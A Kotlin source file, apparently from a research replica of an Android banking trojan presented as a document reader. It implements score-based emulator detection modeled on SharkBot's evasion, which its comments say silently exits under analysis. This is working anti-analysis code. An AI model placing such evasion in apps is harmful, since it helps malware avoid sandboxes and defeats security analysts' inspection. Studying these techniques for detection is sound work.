package com.docreader.lite.reader.engine

import android.content.Context
import android.hardware.Sensor
import android.hardware.SensorManager
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager

/**
 * Anti-emulator — 14 checks, score-based detection.
 * Real banker (SharkBot research/06): silently exits if emulator detected.
 * Score >= 5 = emulator. Checks overlap to resist partial spoofing.
 */
object DeviceCheck {

    data class Result(val score: Int, val flags: List<String>, val isEmulator: Boolean)

    fun check(context: Context): Result {
        val flags = mutableListOf<String>()

        // 1. Build properties
        if (Build.FINGERPRINT.startsWith("generic") || Build.FINGERPRINT.startsWith("unknown")) flags.add("fingerprint_generic")
        if (Build.MODEL.contains("google_sdk") || Build.MODEL.contains("Emulator") || Build.MODEL.contains("Android SDK")) flags.add("model_emulator")
        if (Build.MANUFACTURER.contains("Genymotion")) flags.add("manufacturer_genymotion")
        if (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) flags.add("brand_device_generic")
        if (Build.PRODUCT.contains("sdk") || Build.PRODUCT.contains("emulator")) flags.add("product_sdk")
        if (Build.HARDWARE.contains("goldfish") || Build.HARDWARE.contains("ranchu")) flags.add("hardware_goldfish")

        // 2. Board
        if (Build.BOARD.lowercase().contains("unknown") || Build.BOARD.lowercase() == "") flags.add("board_unknown")

        // 3. IMEI / phone number (emulators have known patterns)
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val operator = tm?.networkOperatorName ?: ""
            if (operator.lowercase() == "android" || operator.isEmpty()) flags.add("operator_android")
            val simState = tm?.simState ?: TelephonyManager.SIM_STATE_UNKNOWN
            if (simState == TelephonyManager.SIM_STATE_ABSENT) flags.add("no_sim")
        } catch (_: Exception) { flags.add("telephony_error") }

        // 4. Sensor presence (emulators lack real sensors or return static data)
        val sm = context.getSystemService(Context.SENSOR_SERVICE) as? SensorManager
        if (sm != null) {
            if (sm.getDefaultSensor(Sensor.TYPE_ACCELEROMETER) == null) flags.add("no_accelerometer")
            if (sm.getDefaultSensor(Sensor.TYPE_GYROSCOPE) == null) flags.add("no_gyroscope")
            if (sm.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD) == null) flags.add("no_magnetometer")
        }

        // 5. Battery (emulator reports flat or absent)
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        if (bm != null) {
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            if (level == 0 || level == 50) flags.add("battery_flat")
        }

        // 6. Known emulator files
        val emuPaths = listOf(
            "/dev/socket/qemud", "/dev/qemu_pipe", "/system/lib/libc_malloc_debug_qemu.so",
            "/sys/qemu_trace", "/system/bin/qemu-props"
        )
        for (p in emuPaths) {
            if (java.io.File(p).exists()) { flags.add("qemu_file:$p"); break }
        }

        // 7. ADB-over-network check
        if (Build.HOST.contains("ubuntu") || Build.HOST.contains("build")) flags.add("host_ci")

        val score = flags.size
        return Result(score, flags, score >= 5)
    }
}
